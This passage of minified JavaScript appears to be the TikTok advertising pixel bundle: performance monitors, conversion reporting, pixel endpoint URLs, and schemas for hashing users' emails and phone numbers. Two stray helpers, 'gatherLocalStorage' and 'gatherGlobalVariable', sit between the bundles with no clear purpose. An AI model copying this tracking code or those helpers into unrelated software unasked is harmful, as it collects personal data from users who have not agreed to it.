        }), i = this.baseHandler.bind(this, "fid"), o = g(), p(function (t) {
          t.startTime < o.timeStamp && (t = t.processingStart - t.startTime, i(t));
        }, {
          type: "first-input"
        }), a = this.baseHandler.bind(this, "tti"), w.a.getFirstConsistentlyInteractive({}).then(function (t) {
          a(t);
        }), c = this.baseHandler.bind(this, "fcp"), -1 === _(v) ? (u = g(), p(function (t) {
          t.name === v && (t.startTime < u.timeStamp ? c(t.startTime) : c(-1));
        }, {
          type: "paint",
          buffered: !0
        })) : c(_(v)), s = this.baseHandler.bind(this, "lcp"), l = g(), d = p(h, {
          type: "largest-contentful-paint",
          buffered: !(f = 0)
        }), y(function () {
          d && (d.takeRecords().forEach(h), d.disconnect()), s(f);
        });
      }, x.prototype.updatePerformanceTiming = function () {
        var t = this,
          e = {
            navigationStart: (r = window.performance.timing).navigationStart,
            loadEventStart: r.loadEventStart,
            requestStart: r.responseStart
          },
          n = e.navigationStart,
          r = e.loadEventStart,
          e = e.requestStart;
        this.baseHandler("navigationStart", n), this.baseHandler("loadEventStart", r), this.baseHandler("requestStart", e), 0 !== n && 0 !== r && 0 !== e || setTimeout(function () {
          t.updatePerformanceTiming();
        }, 5e3);
      }, x.prototype.baseHandler = function (t, e) {
        this.everythingDone || -1 === this[t] && 0 !== e && -1 !== e && (this.changedMap[t] = !0, this[t] = e);
      }, x.prototype.pageUrlWillChange = function (t, e) {}, x.prototype.pageUrlDidChange = function (t) {
        var e = this;
        this.everythingDone = S.every(function (t) {
          return -1 !== e[t];
        }), this.changedMap.navigationStart = !0;
      }, x.prototype.pageWillLeave = function (t) {}, x.prototype.getResult = function () {
        var t,
          e,
          n = {};
        if (this.everythingDone) n = this.getAllData();else try {
          for (var r = T(Object.keys(this.changedMap)), i = r.next(); !i.done; i = r.next()) {
            var o = i.value;
            n[o] = this[o];
          }
        } catch (a) {
          t = {
            error: a
          };
        } finally {
          try {
            i && !i.done && (e = r["return"]) && e.call(r);
          } finally {
            if (t) throw t.error;
          }
        }
        return this.clearAfterReport(), n;
      }, x.prototype.getAllData = function () {
        var n = this;
        return S.reduce(function (t, e) {
          return t[e] = n[e], t;
        }, {});
      }, x.prototype.isChanged = function () {
        return 0 !== Object.keys(this.changedMap).length;
      }, x);
    function x() {
      var t = this;
      this.fcp = -1, this.lcp = -1, this.cls = -1, this.fid = -1, this.tti = -1, this.navigationStart = -1, this.loadEventStart = -1, this.requestStart = -1, this.everythingDone = !1, this.changedMap = {}, this.clearAfterReport = function () {
        t.changedMap = {};
      }, this.initPerformanceData();
    }
    var O,
      H,
      k = n("Mo1V"),
      j = undefined && undefined.__extends || (O = function (t, e) {
        return (O = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, e) {
          t.__proto__ = e;
        } || function (t, e) {
          for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]);
        })(t, e);
      }, function (t, e) {
        function n() {
          this.constructor = t;
        }
        O(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n());
      }),
      A = undefined && undefined.__read || function (t, e) {
        var n = "function" == typeof Symbol && t[Symbol.iterator];
        if (!n) return t;
        var r,
          i,
          o = n.call(t),
          a = [];
        try {
          for (; (void 0 === e || 0 < e--) && !(r = o.next()).done;) a.push(r.value);
        } catch (c) {
          i = {
            error: c
          };
        } finally {
          try {
            r && !r.done && (n = o["return"]) && n.call(o);
          } finally {
            if (i) throw i.error;
          }
        }
        return a;
      },
      C = (H = i.a, j(P, H), P.prototype.pageUrlWillChange = function (e, n) {
        this.monitors.forEach(function (t) {
          t.pageUrlWillChange(e, n);
        }), e && this.report();
      }, P.prototype.pageWillLeave = function (e) {
        this.monitors.forEach(function (t) {
          t.pageWillLeave(e);
        }), this.report();
      }, P.prototype.pageUrlDidChange = function (e) {
        this.currentUrl !== e && (this.currentUrl = e, this.monitors.forEach(function (t) {
          t.pageUrlDidChange(e);
        }), this.report());
      }, P.prototype.report = function () {
        var t = this.transformReportData(this.collectorData());
        Object.keys(t).length && this.context.methods.mergeTrack(t, k.a.PERFORMANCE_INTERACTION);
      }, P.prototype.collectorData = function () {
        return this.monitors.reduce(function (t, e) {
          return t = e.isChanged() ? Object.assign({}, t, e.getResult()) : t;
        }, {});
      }, P.prototype.transformReportData = function (t) {
        return Object.entries(t).reduce(function (t, e) {
          var n = A(e, 2),
            e = n[0],
            n = n[1];
          return t[l[e]] = n, t;
        }, {});
      }, P);
    function P(t) {
      var e = H.call(this, t) || this;
      e.monitors = [], e.currentUrl = "";
      var n = new d(),
        t = new E();
      return e.monitors.push(n), e.monitors.push(t), setInterval(function () {
        e.report();
      }, 1e4), e;
    }
    var I = n("qGTL"),
      b = n("ZFXO"),
      i = n("SbFU"),
      j = n("GJ6r"),
      n = Object(I.a)("ttclid"),
      I = "";
    try {
      var D = window.sessionStorage && window.sessionStorage.getItem(b.a);
      D && (I = JSON.parse(D).callback);
    } catch (L) {}
    i = null === (i = (Object(i.e)() || [])._plugins) || void 0 === i ? void 0 : i.PerformanceInteraction;
    (n || I || Object(j.f)() || i) && Object(r.a)("PerformanceInteraction", function (t) {
      return new C(t);
    }, !0);
    e["default"] = C;
  },
  qGTL: function (t, e, n) {
    "use strict";

    n.d(e, "a", function () {
      return r;
    }), n.d(e, "b", function () {
      return i;
    });
    var r = function (t, e) {
      e = i(e || window.location.href, t);
      return e || i(document.referrer, t);
    };
    function i(t, e) {
      try {
        return new URL(t).searchParams.get(e) || "";
      } catch (n) {
        return "";
      }
    }
  },
  "u+wH": function (t, e, n) {
    "use strict";

    n.r(e), n.d(e, "nanoid", function () {
      return c;
    }), n.d(e, "customAlphabet", function () {
      return a;
    }), n.d(e, "customRandom", function () {
      return o;
    }), n.d(e, "urlAlphabet", function () {
      return r;
    }), n.d(e, "random", function () {
      return i;
    });
    let r = "useandom-26T198340PX75pxJACKVERYMINDBUSHWOLF_GQZbfghjklqvwyzrict",
      i = t => crypto.getRandomValues(new Uint8Array(t)),
      o = (i, t, o) => {
        let a = (2 << Math.log(i.length - 1) / Math.LN2) - 1,
          c = -~(1.6 * a * t / i.length);
        return (e = t) => {
          let n = "";
          for (;;) {
            var r = o(c);
            let t = c;
            for (; t--;) if (n += i[r[t] & a] || "", n.length === e) return n;
          }
        };
      },
      a = (t, e = 21) => o(t, e, i),
      c = (e = 21) => {
        let n = "";
        for (var r = crypto.getRandomValues(new Uint8Array(e)); e--;) {
          let t = 63 & r[e];
          t < 36 ? n += t.toString(36) : t < 62 ? n += (t - 26).toString(36).toUpperCase() : t < 63 ? n += "_" : n += "-";
        }
        return n;
      };
  },
  w0s3: function (t, e, n) {
    "use strict";

    n.d(e, "f", function () {
      return r;
    }), n.d(e, "c", function () {
      return i;
    }), n.d(e, "b", function () {
      return o;
    }), n.d(e, "i", function () {
      return a;
    }), n.d(e, "a", function () {
      return c;
    }), n.d(e, "g", function () {
      return u;
    }), n.d(e, "h", function () {
      return s;
    }), n.d(e, "e", function () {
      return l;
    }), n.d(e, "d", function () {
      return f;
    });
    var r = "TiktokAnalyticsObject",
      i = "ttq",
      o = "external",
      a = "tiktok",
      c = "https://analytics.tiktok.com/i18n/pixel/config.js",
      u = "https://analytics.tiktok.com/i18n/pixel/pickup.js",
      s = "https://analytics.tiktok.com/i18n/pixel/identify.js",
      l = "https://analytics.tiktok.com/i18n/pixel/enable_cookie",
      f = "https://analytics.tiktok.com/i18n/pixel/disable_cookie";
  },
  yLpj: function (t, e) {
    var n = function () {
      return this;
    }();
    try {
      n = n || new Function("return this")();
    } catch (r) {
      "object" == typeof window && (n = window);
    }
    t.exports = n;
  }
});
function gatherLocalStorage() {
  return localStorage;
}
!function (e) {
  var r = {};
  function o(t) {
    if (r[t]) return r[t].exports;
    var n = r[t] = {
      i: t,
      l: !1,
      exports: {}
    };
    return e[t].call(n.exports, n, n.exports, o), n.l = !0, n.exports;
  }
  o.m = e, o.c = r, o.d = function (t, n, e) {
    o.o(t, n) || Object.defineProperty(t, n, {
      enumerable: !0,
      get: e
    });
  }, o.r = function (t) {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, o.t = function (n, t) {
    if (1 & t && (n = o(n)), 8 & t) return n;
    if (4 & t && "object" == typeof n && n && n.__esModule) return n;
    var e = Object.create(null);
    if (o.r(e), Object.defineProperty(e, "default", {
      enumerable: !0,
      value: n
    }), 2 & t && "string" != typeof n) for (var r in n) o.d(e, r, function (t) {
      return n[t];
    }.bind(null, r));
    return e;
  }, o.n = function (t) {
    var n = t && t.__esModule ? function () {
      return t["default"];
    } : function () {
      return t;
    };
    return o.d(n, "a", n), n;
  }, o.o = function (t, n) {
    return Object.prototype.hasOwnProperty.call(t, n);
  }, o.p = "https://analytics.tiktok.com/i18n/pixel/", o(o.s = "NkTT");
}({
  "/6w+": function (t, n, e) {
    "use strict";

    var r, o, i;
    e.d(n, "b", function () {
      return r;
    }), e.d(n, "a", function () {
      return o;
    }), e.d(n, "c", function () {
      return i;
    }), (n = r = r || {})[n.OTHER = 0] = "OTHER", n[n.ANDROID = 1] = "ANDROID", n[n.IOS = 2] = "IOS", (n = o = o || {}).LOAD_START = "load_start", n.LOAD_END = "load_end", n.BEFORE_INIT = "before_init", n.INIT_START = "init_start", n.INIT_END = "init_end", n.JSB_INIT_START = "jsb_init_start", n.JSB_INIT_END = "jsb_init_end", n.BEFORE_AD_INFO_INIT_START = "before_ad_info_init_start", n.AD_INFO_INIT_START = "ad_info_init_start", n.AD_INFO_INIT_END = "ad_info_init_end", n.IDENTIFY_INIT_START = "identify_init_start", n.IDENTIFY_INIT_END = "identify_init_end", n.PLUGIN_INIT_START = "_init_start", n.PLUGIN_INIT_END = "_init_end", n.PIXEL_SEND = "pixel_send", n.PIXEL_SEND_PCM = "pixel_send_PCM", n.JSB_SEND = "jsb_send", n.HTTP_SEND = "http_send", n.HANDLE_CACHE = "handle_cache", n.INIT_ERROR = "init_error", n.PIXEL_EMPTY = "pixel_empty", n.JSB_ERROR = "jsb_error", n.API_ERROR = "api_error", n.PLUGIN_ERROR = "plugin_error", n.CUSTOM_INFO = "custom_info", n.CUSTOM_ERROR = "custom_error", (n = i = i || {})[n.IFRAME = 1] = "IFRAME", n[n.NORMAL = 2] = "NORMAL", n[n.WEBWORKER = 3] = "WEBWORKER";
  },
  "2HLQ": function (t, n, e) {
    "use strict";

    var r;
    e.d(n, "a", function () {
      return r;
    }), (n = r = r || {})[n.NOT_SURE = 0] = "NOT_SURE", n[n.INVOKE_METHOD_ENABLED = 1] = "INVOKE_METHOD_ENABLED", n[n.INVOKE_METHOD_NOT_ENABLED = 2] = "INVOKE_METHOD_NOT_ENABLED", n[n.TOUTIAO_BRIDGE_NOT_ENABLED = 3] = "TOUTIAO_BRIDGE_NOT_ENABLED";
  },
  GJ6r: function (t, _, p) {
    "use strict";

    !function (t) {
      p.d(_, "a", function () {
        return r;
      }), p.d(_, "g", function () {
        return o;
      }), p.d(_, "e", function () {
        return c;
      }), p.d(_, "f", function () {
        return a;
      }), p.d(_, "b", function () {
        return f;
      }), p.d(_, "d", function () {
        return s;
      }), p.d(_, "c", function () {
        return d;
      });
      var n = p("SbFU"),
        e = (p("2HLQ"), p("IOsT"), p("w0s3")),
        r = function () {
          return "undefined" != typeof globalThis ? globalThis : "undefined" != typeof self ? self : "undefined" != typeof window ? window : void 0 !== t ? t : new Function("return this")();
        },
        o = function () {
          var t = r();
          return "undefined" != typeof t.DedicatedWorkerGlobalScope ? t instanceof t.DedicatedWorkerGlobalScope : "DedicatedWorkerGlobalScope" === t.constructor.name;
        },
        i = function () {
          var t = r();
          return "object" == typeof navigator ? navigator.userAgent : t._userAgent || "";
        },
        u = function () {
          var t;
          return (null === (t = null === (t = Object(n.e)()) || void 0 === t ? void 0 : t._env) || void 0 === t ? void 0 : t.env) || e.b;
        },
        c = function () {
          return u() !== e.b;
        },
        a = function () {
          return u() === e.i;
        },
        l = (Object(n.n)(function () {
          return /open_news/i.test(i());
        }), Object(n.n)(function () {
          return /ultralite/i.test(i());
        }), function () {
          return /windows phone/i.test(i()) ? "Windows Phone" : /android/i.test(i()) ? "android" : /iPad|iPhone|iPod/.test(i()) ? "ios" : "pc";
        }),
        f = function () {
          return "android" === l();
        },
        s = function () {
          return "ios" === l();
        },
        d = function () {
          return "development" === "production".trim();
        };
    }.call(this, p("yLpj"));
  },
  HyyX: function (t, n, e) {
    "use strict";

    e.d(n, "c", function () {
      return r;
    }), e.d(n, "a", function () {
      return o;
    }), e.d(n, "b", function () {
      return i;
    });
    var r = ["email", "phone_number", "auto_email", "auto_phone_number", "external_id", "sha256_email", "sha256_phone_number", "sha256_external_id"];
    (n = u = u || {}).missing = "missing", n.valid = "valid", n.invalid = "invalid", (n = {}).empty = "empty", n.whitespace = "whitespace", n.hardcode = "hardcode", n.encode = "encode", (n = {}).invalidCountry = "invalid_country", n.notANumber = "not_a_number", n.tooShort = "too_short", n.tooLong = "too_long", n.invalidLength = "invalid_length", n.emptyCountryCodeThroughIP = "empty_country_code_through_ip", n.invalidCountryAfterInjectPlus = "invalid_country_after_inject_plus", n.notANumberAfterInjectPlus = "not_a_number_after_inject_plus", n.tooShortAfterInjectPlus = "too_short_after_inject_plus", n.tooLongAfterInjectPlus = "too_long_after_inject_plus", n.invalidLengthAfterInjectPlus = "invalid_length_after_inject_plus", n.invalidCountryAfterInjectCountry = "invalid_country_after_inject_country", n.notANumberAfterInjectCountry = "not_a_number_after_inject_country", n.tooShortAfterInjectCountry = "too_short_after_inject_country", n.tooLongAfterInjectCountry = "too_long_after_inject_country", n.invalidLengthAfterInjectCountry = "invalid_length_after_inject_country", (n = {}).letterCase = "letter_case", n.isNotValidEmail = "is_not_valid_email", n.isNotPossibleEmail = "is_not_possible_email", n.domainTypo = "domain_typo", n.addressFormat = "address_format";
    var o, i, u;
    u.missing, u.missing, u.missing, u.missing, u.missing, u.missing;
    (u = o = o || {}).EMPTY_VALUE = "empty_value", u.WRONG_FORMAT = "wrong_format", u.CORRECT_FORMAT = "correct_format", u.HASHED = "hashed", u.HASHED_ERR = "hashed_err", u.HASHED_CORRECT = "hashed_correct", u.PLAINTEXT_EMAIL = "plaintext_email", u.PLAINTEXT_PHONE = "plaintext_phone", (u = i = i || {}).EMPTY_VALUE = "empty_value", u.PLAIN_EMAIL = "plain_email", u.PLAIN_PHONE = "plain_phone", u.HASHED = "hashed", u.FILTER_EVENTS = "filter_events", u.UNKNOWN_INVALID = "unknown_invalid", u.BASE64_STRING_HASHED = "base64_string_hashed", u.BASE64_HEX_HASHED = "base64_hex_hashed", u.PLAIN_MDN_EMAIL = "plain_mdn_email", (u = {}).Manual = "manual", u.Auto = "auto";
  },
  IOsT: function (t, n, e) {
    "use strict";

    var r;
    e.d(n, "a", function () {
      return r;
    }), (n = r = r || {}).Normal = "1", n.Iframe = "2", n.WebWorker = "3", n.SandboxIframe = "4";
  },
  NkTT: function (t, n, e) {
    "use strict";

    e.r(n);
    var r = e("SnBs"),
      a = e("SbFU"),
      l = e("fe1q");
    var o,
      i,
      f = e("/6w+"),
      u = undefined && undefined.__extends || (o = function (t, n) {
        return (o = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, n) {
          t.__proto__ = n;
        } || function (t, n) {
          for (var e in n) n.hasOwnProperty(e) && (t[e] = n[e]);
        })(t, n);
      }, function (t, n) {
        function e() {
          this.constructor = t;
        }
        o(t, n), t.prototype = null === n ? Object.create(n) : (e.prototype = n.prototype, new e());
      }),
      c = (i = r.a, u(s, i), s.prototype.contextInitStart = function () {
        this.context.methods.reportFlConv = this.reportFlConv.bind(this);
      }, s.prototype.reportFlConv = function (t) {
        if (t && "Pageview" !== t.event) {
          var n = t.context.ad.log_extra !== undefined ? t.context.ad.log_extra : "{}";
          try {
            e = JSON.parse(n);
          } catch (c) {
            e = {};
          }
          var e,
            r = t.properties || {},
            o = {
              req_id: e.req_id || "",
              cid: t.context.ad.creative_id || "",
              value: r.value || "",
              currency: r.currency || "",
              raw: t.properties
            },
            i = r.value,
            u = r.currency,
            n = Object(a.h)(),
            n = (e = i, r = u, n = n, isNaN(e) || e < 0 || null === n || !n[r] ? "" : (1e5 * (e / n[r])).toFixed(0)),
            r = t.context.pixel ? t.context.pixel.code : "";
          n && (o.usd_value = n, Object(l.c)(f.a.CUSTOM_INFO, {
            pixelCode: r,
            custom_name: "odfl_rate_exchange",
            extJSON: {
              message_id: t.message_id,
              cid: o.cid,
              event: t.event,
              value: i,
              currency: u,
              usdValue: n
            }
          }));
          n = {
            business: "devicefl_join_label",
            entrance: "app_to_web_conversion",
            inputParams: {
              message_id: t.message_id,
              event: t.event,
              event_props: o,
              event_source_id: null === (u = t.context.pixel) || void 0 === u ? void 0 : u.code,
              event_source_type: "web"
            }
          };
          null !== (u = this.context.reportService) && void 0 !== u && u.reportFL && (this.context.reportService.reportFL(n), Object(l.c)(f.a.CUSTOM_INFO, {
            pixelCode: r,
            custom_name: "fl_jsb_report",
            extJSON: {
              message_id: t.message_id,
              cid: o.cid,
              event: t.event
            }
          }));
        }
      }, s);
    function s(t) {
      t = i.call(this, t) || this;
      return t.name = "WebFL", t;
    }
    e = e("Pd38");
    Object(e.a)("WebFL", function (t) {
      return new c(t);
    });
    n["default"] = c;
  },
  Pd38: function (t, n, e) {
    "use strict";

    e.d(n, "a", function () {
      return r;
    });
    var o = e("SbFU"),
      r = function (n, t, e) {
        void 0 === e && (e = !1);
        var r = Object(o.e)() || [];
        if (r.dynamicPlugins || (r.dynamicPlugins = []), !r.dynamicPlugins.find(function (t) {
          return t.name === n;
        })) {
          if (!e) if (!Object(o.m)(n)) return;
          r.dynamicPlugins.push({
            name: n,
            handler: t
          });
        }
      };
  },
  SbFU: function (t, n, e) {
    "use strict";

    e.d(n, "f", function () {
      return c;
    }), e.d(n, "j", function () {
      return a;
    }), e.d(n, "e", function () {
      return l;
    }), e.d(n, "m", function () {
      return f;
    }), e.d(n, "l", function () {
      return s;
    }), e.d(n, "g", function () {
      return d;
    }), e.d(n, "h", function () {
      return _;
    }), e.d(n, "d", function () {
      return p;
    }), e.d(n, "p", function () {
      return h;
    }), e.d(n, "c", function () {
      return y;
    }), e.d(n, "o", function () {
      return v;
    }), e.d(n, "n", function () {
      return b;
    }), e.d(n, "k", function () {
      return m;
    }), e.d(n, "b", function () {
      return g;
    }), e.d(n, "a", function () {
      return O;
    }), e.d(n, "i", function () {
      return E;
    });
    e("GJ6r");
    var r = e("w0s3"),
      o = (e("HyyX"), undefined && undefined.__awaiter || function (t, n, c, a) {
        return new (c = c || Promise)(function (e, r) {
          function o(t) {
            try {
              u(a.next(t));
            } catch (n) {
              r(n);
            }
          }
          function i(t) {
            try {
              u(a["throw"](t));
            } catch (n) {
              r(n);
            }
          }
          function u(t) {
            var n;
            t.done ? e(t.value) : ((n = t.value) instanceof c ? n : new c(function (t) {
              t(n);
            })).then(o, i);
          }
          u((a = a.apply(t, n || [])).next());
        });
      }),
      i = undefined && undefined.__generator || function (e, r) {
        var o,
          i,
          u,
          c = {
            label: 0,
            sent: function () {
              if (1 & u[0]) throw u[1];
              return u[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: n(0),
            "throw": n(1),
            "return": n(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function n(n) {
          return function (t) {
            return a([n, t]);
          };
        }
        function a(t) {
          if (o) throw new TypeError("Generator is already executing.");
          for (; c;) try {
            if (o = 1, i && (u = 2 & t[0] ? i["return"] : t[0] ? i["throw"] || ((u = i["return"]) && u.call(i), 0) : i.next) && !(u = u.call(i, t[1])).done) return u;
            switch (i = 0, (t = u ? [2 & t[0], u.value] : t)[0]) {
              case 0:
              case 1:
                u = t;
                break;
              case 4:
                return c.label++, {
                  value: t[1],
                  done: !1
                };
              case 5:
                c.label++, i = t[1], t = [0];
                continue;
              case 7:
                t = c.ops.pop(), c.trys.pop();
                continue;
              default:
                if (!(u = 0 < (u = c.trys).length && u[u.length - 1]) && (6 === t[0] || 2 === t[0])) {
                  c = 0;
                  continue;
                }
                if (3 === t[0] && (!u || t[1] > u[0] && t[1] < u[3])) {
                  c.label = t[1];
                  break;
                }
                if (6 === t[0] && c.label < u[1]) {
                  c.label = u[1], u = t;
                  break;
                }
                if (u && c.label < u[2]) {
                  c.label = u[2], c.ops.push(t);
                  break;
                }
                u[2] && c.ops.pop(), c.trys.pop();
                continue;
            }
            t = r.call(e, c);
          } catch (n) {
            t = [6, n], i = 0;
          } finally {
            o = u = 0;
          }
          if (5 & t[0]) throw t[1];
          return {
            value: t[0] ? t[1] : void 0,
            done: !0
          };
        }
      },
      u = undefined && undefined.__read || function (t, n) {
        var e = "function" == typeof Symbol && t[Symbol.iterator];
        if (!e) return t;
        var r,
          o,
          i = e.call(t),
          u = [];
        try {
          for (; (void 0 === n || 0 < n--) && !(r = i.next()).done;) u.push(r.value);
        } catch (c) {
          o = {
            error: c
          };
        } finally {
          try {
            r && !r.done && (e = i["return"]) && e.call(i);
          } finally {
            if (o) throw o.error;
          }
        }
        return u;
      },
      c = (undefined && undefined.__spread, function () {
        var t = l();
        return t._partner || "";
      }),
      a = function () {
        var t = l();
        return t && t.initialize;
      },
      l = function () {
        return "object" == typeof window && window["object" == typeof window && window[r.f] || r.c];
      },
      f = function (t) {
        try {
          var n = l()._plugins || {};
          return null == n[t] || !!n[t];
        } catch (e) {
          return !0;
        }
      },
      s = function () {
        try {
          var t = l();
          return t && t._legacy && 0 !== t._legacy.length ? Object.keys(t._t).length > Object.keys(t._legacy).length || Object.keys(t.context.data.pixelMap).length > Object.keys(t._legacy).length : !1;
        } catch (n) {
          return !1;
        }
      },
      d = function (t) {
        try {
          var n = l();
          if (n && n._self_host_config && n._self_host_config[t]) return n._self_host_config[t] || "";
        } catch (e) {
          return "";
        }
        return "";
      },
      _ = function () {
        var t;
        try {
          return (null === (t = l()) || void 0 === t ? void 0 : t._usd_exchange_rate) || null;
        } catch (n) {
          return null;
        }
      },
      p = function () {
        return new Date(Date.now() + 864e5).toUTCString();
      };
    function h(e, r) {
      void 0 === r && (r = 500);
      var o = Date.now();
      return function () {
        var t = arguments,
          n = Date.now();
        r <= n - o && (e.apply(null, t), o = Date.now());
      };
    }
    function y(e, r, o) {
      var i;
      return function () {
        for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
        clearTimeout(i), i = setTimeout(function () {
          e.apply(o, t);
        }, r);
      };
    }
    function v(n) {
      return void 0 === n && (n = 500), o(this, void 0, void 0, function () {
        return i(this, function (t) {
          return [2, new Promise(function (t) {
            setTimeout(function () {
              t(!0);
            }, n);
          })];
        });
      });
    }
    function b(e, r) {
      var o,
        i = e;
      return function () {
        for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
        return i && (o = e.apply(r, t), i = null), o;
      };
    }
    function m(t, n) {
      return 0 < Object.keys(function i(t, n) {
        var e = {};
        for (var r in t) {
          var o;
          t.hasOwnProperty(r) && !n.hasOwnProperty(r) ? e[r] = t[r] : t.hasOwnProperty(r) && n.hasOwnProperty(r) && t[r] !== n[r] && ("object" == typeof t[r] && "object" == typeof n[r] ? (o = i(t[r], n[r]), 0 < Object.keys(o).length && (e[r] = o)) : e[r] = t[r]);
        }
        for (var r in n) n.hasOwnProperty(r) && !t.hasOwnProperty(r) && (e[r] = n[r]);
        return e;
      }(t, n)).length;
    }
    var g = ["input[type='button']", "input[type='image']", "input[type='submit']", "button", "[class*=btn]", "[class*=Btn]", "[class*=button]", "[class*=Button]", "[role*=button]", "[id*=btn]", "[id*=Btn]", "[id*=button]", "[id*=Button]", "a"],
      O = ["[href^='tel:']", "[href^='callto:']", "[href^='sms:']", "[href^='skype:']", "[href^='whatsapp:']", "[href^='mailto:']"],
      E = function (n) {
        var t = g.some(function (t) {
            return n.matches(t);
          }),
          e = O.some(function (t) {
            return n.matches(t);
          });
        return t && !e;
      };
  },
  SnBs: function (t, n, e) {
    "use strict";

    e.d(n, "a", function () {
      return o;
    });
    var r,
      n = undefined && undefined.__extends || (r = function (t, n) {
        return (r = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, n) {
          t.__proto__ = n;
        } || function (t, n) {
          for (var e in n) n.hasOwnProperty(e) && (t[e] = n[e]);
        })(t, n);
      }, function (t, n) {
        function e() {
          this.constructor = t;
        }
        r(t, n), t.prototype = null === n ? Object.create(n) : (e.prototype = n.prototype, new e());
      }),
      o = (i.prototype.pageDidLoad = function () {}, i.prototype.pixelDidMount = function (t) {}, i.prototype.pageUrlWillChange = function (t, n) {}, i.prototype.pageUrlDidChange = function (t, n) {}, i.prototype.initStart = function () {}, i.prototype.initEnd = function () {}, i.prototype.adInfoInitStart = function () {}, i.prototype.adInfoInitEnd = function () {}, i.prototype.contextInitStart = function () {}, i.prototype.contextInitEnd = function () {}, i.prototype.pluginInitStart = function (t) {}, i.prototype.pluginInitEnd = function (t) {}, i.prototype.pixelCreateStart = function (t) {}, i.prototype.pixelCreateEnd = function (t) {}, i.prototype.pixelInitEnd = function (t) {}, i.prototype.pixelSend = function (t, n, e, r, o) {}, i.prototype.pageWillLeave = function (t) {}, i);
    function i(t) {
      t && (this.context = t);
    }
    var u;
    n(c, u = o), c.prototype.pixelDidMount = function (t) {
      var n = t.pixelCode,
        t = this.getTrackType(),
        e = this.context.methods.batchTrack.bind(this.context, {
          pixelCode: n,
          type: t
        });
      this.batchReportFunctions.push(e), this.stash.forEach(function (t) {
        e(t, !1);
      });
    }, c.prototype.pageUrlWillChange = function (t, n) {}, c.prototype.pageUrlDidChange = function (t) {
      t !== this.currentUrl && (this.oldUrl = this.currentUrl, this.currentUrl = t);
    }, c.prototype.handleCacheData = function () {
      var t = this;
      this.stash.forEach(function (n) {
        t.batchReportFunctions.forEach(function (t) {
          t(n, !1);
        });
      });
    }, c.prototype.track = function (n, e) {
      this.stash.push(n), this.batchReportFunctions.forEach(function (t) {
        t(n, e);
      });
    };
    function c(t) {
      var e = u.call(this, t) || this;
      return e.batchReportFunctions = [], e.currentUrl = "", e.oldUrl = "", e.stash = [], e.batchReportFunctions = e.context.methods.getAllPixels().map(function (t) {
        var n = t.pixelCode,
          t = e.getTrackType();
        return e.context.methods.batchTrack.bind(e.context, {
          pixelCode: n,
          type: t
        });
      }), e;
    }
  },
  fe1q: function (t, n, e) {
    "use strict";

    e.d(n, "c", function () {
      return r;
    }), e.d(n, "a", function () {
      return i;
    }), e.d(n, "b", function () {
      return u;
    });
    var o = e("SbFU");
    function r() {
      for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
      try {
        var e = Object(o.e)().monitor;
        e && e.info.apply(e, t);
      } catch (r) {}
    }
    function i() {
      for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
      try {
        var e = Object(o.e)().monitor;
        e && e.error.apply(e, t);
      } catch (r) {}
    }
    function u() {
      try {
        0;
        var t = document && document.currentScript,
          n = t && t.src || "http://emptyURLSrc",
          e = /i18n\/pixel\/events\.js/.test(n),
          r = /i18n\/pixel\/sdk\.js/.test(n),
          o = new URL(n).searchParams,
          i = o.get("sdkid") || t && t.getAttribute("data-id") || "";
        return e ? {
          lib: o.get("lib") || "ttq",
          pixelCode: i
        } : r ? {
          lib: "_taq",
          pixelCode: i
        } : {
          lib: "ttq",
          pixelCode: i
        };
      } catch (u) {
        return {
          lib: "ttq",
          pixelCode: ""
        };
      }
    }
  },
  "u+wH": function (t, n, e) {
    "use strict";

    e.r(n), e.d(n, "nanoid", function () {
      return c;
    }), e.d(n, "customAlphabet", function () {
      return u;
    }), e.d(n, "customRandom", function () {
      return i;
    }), e.d(n, "urlAlphabet", function () {
      return r;
    }), e.d(n, "random", function () {
      return o;
    });
    let r = "useandom-26T198340PX75pxJACKVERYMINDBUSHWOLF_GQZbfghjklqvwyzrict",
      o = t => crypto.getRandomValues(new Uint8Array(t)),
      i = (o, t, i) => {
        let u = (2 << Math.log(o.length - 1) / Math.LN2) - 1,
          c = -~(1.6 * u * t / o.length);
        return (n = t) => {
          let e = "";
          for (;;) {
            var r = i(c);
            let t = c;
            for (; t--;) if (e += o[r[t] & u] || "", e.length === n) return e;
          }
        };
      },
      u = (t, n = 21) => i(t, n, o),
      c = (n = 21) => {
        let e = "";
        for (var r = crypto.getRandomValues(new Uint8Array(n)); n--;) {
          let t = 63 & r[n];
          t < 36 ? e += t.toString(36) : t < 62 ? e += (t - 26).toString(36).toUpperCase() : t < 63 ? e += "_" : e += "-";
        }
        return e;
      };
  },
  w0s3: function (t, n, e) {
    "use strict";

    e.d(n, "f", function () {
      return r;
    }), e.d(n, "c", function () {
      return o;
    }), e.d(n, "b", function () {
      return i;
    }), e.d(n, "i", function () {
      return u;
    }), e.d(n, "a", function () {
      return c;
    }), e.d(n, "g", function () {
      return a;
    }), e.d(n, "h", function () {
      return l;
    }), e.d(n, "e", function () {
      return f;
    }), e.d(n, "d", function () {
      return s;
    });
    var r = "TiktokAnalyticsObject",
      o = "ttq",
      i = "external",
      u = "tiktok",
      c = "https://analytics.tiktok.com/i18n/pixel/config.js",
      a = "https://analytics.tiktok.com/i18n/pixel/pickup.js",
      l = "https://analytics.tiktok.com/i18n/pixel/identify.js",
      f = "https://analytics.tiktok.com/i18n/pixel/enable_cookie",
      s = "https://analytics.tiktok.com/i18n/pixel/disable_cookie";
  },
  yLpj: function (t, n) {
    var e = function () {
      return this;
    }();
    try {
      e = e || new Function("return this")();
    } catch (r) {
      "object" == typeof window && (e = window);
    }
    t.exports = e;
  }
});
function gatherGlobalVariable() {
  return globalVars;
}
!function (n) {
  var r = {};
  function o(t) {
